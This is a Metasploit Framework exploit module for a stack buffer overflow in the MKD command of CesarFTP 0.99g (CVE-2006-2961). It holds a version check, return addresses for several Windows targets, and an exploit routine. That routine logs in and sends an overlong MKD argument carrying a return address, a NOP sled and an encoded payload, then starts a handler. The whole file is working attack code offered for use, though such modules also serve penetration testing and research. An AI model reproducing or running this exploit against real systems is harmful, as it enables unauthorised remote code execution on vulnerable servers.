##
# $Id: cesarftp_mkd.rb 11799 2011-02-23 00:58:54Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Cesar FTP 0.99g MKD Command Buffer Overflow\',
			\'Description\'    => %q{
				This module exploits a stack buffer overflow in the MKD verb in CesarFTP 0.99g.

				You must have valid credentials to trigger this vulnerability. Also, you
				only get one chance, so choose your target carefully.
			},
			\'Author\'         => \'MC\',
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 11799 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2006-2961\'],
					[ \'OSVDB\', \'26364\'],
					[ \'BID\', \'18586\'],
					[ \'URL\', \'http://secunia.com/advisories/20574/\' ],
				],
			\'Privileged\'     => true,
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'process\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 250,
					\'BadChars\' => \"\\x00\\x20\\x0a\\x0d\",
					\'StackAdjustment\' => -3500,
					\'Compat\'        =>
						{
							\'SymbolLookup\' => \'ws2ord\',
						}
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					[ \'Windows 2000 Pro SP4 English\', { \'Ret\' => 0x77e14c29 } ],
					[ \'Windows 2000 Pro SP4 French\',  { \'Ret\' => 0x775F29D0 } ],
					[ \'Windows XP SP2/SP3 English\',       { \'Ret\' => 0x774699bf } ], # jmp esp, user32.dll
					#[ \'Windows XP SP2 English\',       { \'Ret\' => 0x76b43ae0 } ], # jmp esp, winmm.dll
					#[ \'Windows XP SP3 English\',       { \'Ret\' => 0x76b43adc } ], # jmp esp, winmm.dll
					[ \'Windows 2003 SP1 English\',     { \'Ret\' => 0x76AA679b } ],
				],
			\'DisclosureDate\' => \'Jun 12 2006\',
			\'DefaultTarget\'  => 0))
	end

	def check
		connect
		disconnect

		if (banner =~ /CesarFTP 0\\.99g/)
			return Exploit::CheckCode::Vulnerable
		end
			return Exploit::CheckCode::Safe
	end

	def exploit
		connect_login

		sploit =  \"\\n\" * 671 + rand_text_english(3, payload_badchars)
		sploit << [target.ret].pack(\'V\') + make_nops(40) + payload.encoded

		print_status(\"Trying target #{target.name}...\")

		send_cmd( [\'MKD\', sploit] , false)

		handler
		disconnect
	end

end
